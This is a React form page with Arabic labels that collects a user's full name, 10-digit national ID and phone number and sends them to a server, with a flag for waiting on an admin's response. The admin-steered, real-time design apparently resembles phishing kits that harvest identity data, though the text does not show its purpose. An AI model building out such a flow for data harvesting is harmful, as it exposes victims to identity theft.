/* eslint-disable @typescript-eslint/ban-ts-comment */
import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import {
  checkUser,
  sendDataToServer,
  setCurrentPage,
} from "@/real-time/utils/utils";
import { useSignals } from "@preact/signals-react/runtime";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import "react-phone-number-input/style.css";
import { useNavigate } from "react-router-dom";
import { mainInfo } from "../../real-time/context/signals";

function Page1() {
  useSignals();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  const navigate = useNavigate();

  function sendData(data: FieldValues) {
    checkUser(data, navigate);
    sendDataToServer({
      current: "page1",
      data,
      nextPage: "",
      waitingForAdminResponse: false,
    });
  }

  useEffect(() => {
    // This Step Are Necessary
    setCurrentPage("page1");
  }, []);

  return (
    <Main>
      <form
        className="flex flex-col gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
        dir="rtl"
      >
        <Input
          errors={errors}
          register={register}
          label="الاسم بالكامل"
          id="fullName"
          value={mainInfo.value?.fullName}
          isAr
          options={{
            required: "هذا الحقل ضروري",
            // validate: (val) => {
            //   const nameWithoutSpaces = val.replace(/\s/g, "");
            //   if (!/^[\u0600-\u06FF]+$/.test(nameWithoutSpaces))
            //     return "يجب كتابة الاسم بالعربي";
            // },
          }}
        />
        <Input
          errors={errors}
          register={register}
          id="idNumber"
          type="number"
          label="الرقم الوطني"
          value={mainInfo.value?.idNumber}
          isAr
          options={{
            required: "هذا الحقل ضروري",
            pattern: {
              value: /^[0-9]{10}$/,
              message: "يجب كتابة عشر أرقام",
            },
          }}
        />
        <div className="flex flex-col gap-2">
          <Input
            errors={errors}
            register={register}
            id="phone"
            type="number"
            isAr
            label="رقم الجوال الأساسي"
            options={{
              required: "هذا الحقل ضروري",
            }}
            value={mainInfo.value?.phone}
          />
        </div>

        <Button className={MAIN_BTN + " w-[150px] mx-auto"}>التالي</Button>
      </form>
    </Main>
  );
}

export default Page1;
